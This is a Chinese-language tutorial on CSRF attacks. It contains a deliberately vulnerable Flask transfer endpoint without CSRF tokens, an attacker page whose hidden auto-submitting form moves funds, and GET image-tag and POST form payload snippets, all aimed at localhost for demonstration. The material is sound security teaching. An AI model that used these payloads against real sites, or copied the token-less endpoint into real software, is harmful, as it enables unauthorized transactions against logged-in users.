<純粹做技術筆記與範例示範>
# 1. CSRF 是什麼？
CSRF，Cross-Site Request Forgery，跨站請求偽造。

核心概念是：
``` explaination
攻擊者不需要拿到你的密碼或 Cookie 內容，只需要讓「已登入的瀏覽器」對目標網站發出一個看起來像使用者本人操作的請求。
```

因為瀏覽器通常會自動附帶目標網站的 Cookie，例如 session cookie，所以伺服器可能誤以為這是合法使用者本人發出的請求。

# 2. CSRF 攻擊成立的基本條件
通常要同時滿足幾件事：

1. 受害者已經登入目標網站，瀏覽器持有有效 session cookie。
2. 目標網站的某些敏感操作只依賴瀏覽器自動送出的 Cookie 來判斷身份。
3. 該操作沒有不可預測的參數，例如 CSRF token。
4. 攻擊者可以誘導受害者載入惡意頁面、點擊連結、載入圖片或提交表單。
5. 瀏覽器在發送請求時會自動附上目標網站的 Cookie。

# 3. 一個典型 CSRF 攻擊流程
假設有一個銀行網站：

``` url
http://localhost:5000/transfer
```
它接受 POST：
``` post method
to=attacker
amount=300
```
並且只看 session cookie 判斷是否登入，沒有 CSRF token。
攻擊流程：

1. 使用者登入銀行網站。
2. 瀏覽器保存銀行的 session cookie。
3. 使用者在另一個網頁看到攻擊者準備的頁面。
4. 攻擊頁面藏有一個自動提交表單。
5. 瀏覽器向銀行網站發送 post 請求。
6. 瀏覽器自動附帶銀行的 cookie。
7. 銀行服務氣以為這是登陸用戶本人發起的請求。
8. 轉帳成功

攻擊者通常不能讀取響應內容，因為同源政策會擋住跨域讀取，但 CSRF 本來就不需要讀取響應，只要副作用發生即可。

# 4. Python 範例
假設 Flask 建立兩個 Local service：
1. 脆弱的目標網站， port 為 5000
2. 攻擊者頁面， port 為 8001
## 4.1 脆弱目標網站：vulnerable_app.py
這個 flask 應用模擬一個有 CSRF 漏洞的轉帳接口。
``` python
# vulnerable_app.py
from flask import Flask, session, request

app = Flask(__name__)

app.secret_key = "insecure-demo-secret-key"

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
)

ACCOUNTS = {
    "alice": 1000,
    "attacker": 0,
}


def current_user():
    return session.get("user")


@app.route("/")
def index():
    user = current_user()
    if not user:
        return '<a href="/login">登入為 alice</a>'

    return f"""
    已登入：{user}<br>
    餘額：{ACCOUNTS[user]}<br>
    <a href="/balance">查看餘額</a>
    """


@app.route("/login")
def login():
    session["user"] = "alice"
    return "已登入為 alice。<a href='/balance'>查看餘額</a>"


@app.route("/logout")
def logout():
    session.clear()
    return "已登出"


@app.route("/balance")
def balance():
    user = current_user()
    if not user:
        return "尚未登入", 403

    return f"{user} 的餘額：{ACCOUNTS[user]}"


@app.route("/transfer", methods=["POST"])
def transfer():
    user = current_user()

    if not user:
        return "尚未登入", 403

    to = request.form.get("to", "")
    try:
        amount = int(request.form.get("amount", "0"))
    except ValueError:
        return "金額錯誤", 400

    if amount <= 0 or ACCOUNTS[user] < amount:
        return "轉帳失敗", 400

    ACCOUNTS[user] -= amount
    ACCOUNTS[to] = ACCOUNTS.get(to, 0) + amount

    return f"已從 {user} 轉 {amount} 給 {to}"


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=False)
```

運行
``` bash
python vulnerable_app.py
```

然後在瀏覽器中打開
``` url
http://localhost:5000/login
```

再查看餘額
``` url
http://localhost:5000/balance
```

正常會看到
``` response
alice 的餘額：1000
```

## 4.2 攻擊者頁面：attacker_app.py
``` python
# attacker_app.py
from flask import Flask

app = Flask(__name__)

ATTACK_PAGE = """
<!doctype html>
<html>
  <body>
    <h1>恭喜中獎！</h1>
    <p>正在載入...</p>

    <form id="csrf" method="POST" action="http://localhost:5000/transfer">
      <input type="hidden" name="to" value="attacker">
      <input type="hidden" name="amount" value="300">
    </form>

    <script>
      document.getElementById("csrf").submit();
    </script>
  </body>
</html>
"""


@app.route("/")
def index():
    return ATTACK_PAGE


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8001, debug=False)
```

運作
``` bash
python attacker_app.py
```

## 4.3 演示步驟
服務建立起來之後，打開 http://localhost:5000/balance ，看到 $$ alice 的餘額：1000 $$

再同一個瀏覽器中打開攻擊者網頁 http://localhost:8001/ ，頁面自動提交一個隱藏表單到 http://localhost:5000/transfer 再回到 http://localhost:5000/balance ，此時攻擊者可以看到 $$ alice 的餘額：700 $$

這表示攻擊頁面成功讓瀏覽器登陸用戶的身分並達成轉帳請求。

## 4.4 瀏覽器開發者工具觀察
F12 打開 DevTools → Network，可以看到 
``` atack
POST http://localhost:5000/transfer
```
這個請求，並且包含：
``` coockies
Cookie: session=...
```
這個 cookie 是瀏覽器自動帶上的，攻擊者不需要知道 cookie 的內容

# 5. HttpOnly 無法防禦 CSRF
HttpOlny 可以防止 javascript 讀取 cookie，對 XSS 且取 Cookie 有幫助，但是 CSRF 不用讀取 cookie，因此瀏覽器發送請求仍然會帶出 cookie。

所以
``` notice
! HttpOnly 不能直接防御 CSRF。
```

# 6. CSRF 範例
## 6.1 GET 攻擊
如果網站是使用 GET 服務進行狀態的變更，如：
``` http
GET /transfer?to=attacker&amount=300
```

攻擊只需要做：
``` http
<img src="http://localhost:5000/transfer?to=attacker&amount=300">
```
## 6.2 POST 攻擊
這是最常見的：
``` html
<form action="http://localhost:5000/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="300">
</form>
<script>
  document.forms[0].submit();
</script>
```
